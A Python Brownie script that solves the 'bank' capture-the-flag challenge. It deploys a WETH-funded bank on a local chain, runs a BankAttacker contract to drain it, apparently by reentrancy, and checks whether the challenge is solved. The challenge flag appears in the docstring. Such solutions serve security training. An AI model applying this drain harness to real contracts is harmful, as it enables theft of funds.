from brownie import Contract, WETH9, SetupBank, BankAttacker
from web3 import Web3
import time
from scripts.helpful_scripts import get_accounts

"""
name: bank
author: samczsun
flag: PCTF{Y0_1_H4ERD_y0U_l1KE_reeN7R4NcY}
tags: ["pwn", "u up?"]
description: |
  Smarter Contracts Inc. is proud to release our decentralized bank. Deposit any ERC20-compatible token and know that it'll be safely stored in our unhackable contracts.
"""


def deploy():
    global deployer, attacker, weth, setupbank, bankAddr
    # [deployer, attacker] = get_accounts(2)
    [_, _, _, deployer, attacker] = get_accounts(5)
    # 开始部署
    weth = WETH9.deploy({"from": deployer})
    setupbank = SetupBank.deploy(
        weth, {"from": deployer, "value": Web3.toWei(50, "ether")}
    )

    bankAddr = setupbank.bank()
    assert weth.balanceOf(bankAddr) == Web3.toWei(50, "ether")


def attack():
    # 攻击代码写到这里
    attack_contract = BankAttacker.deploy(setupbank, weth, {"from": attacker})
    attack_contract.attack({"from": attacker})
    print(weth.balanceOf(bankAddr))
    return


def check():
    # 检测攻击是否完成： 不能继续借贷
    print("running func check..")
    try:
        assert setupbank.isSolved()
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
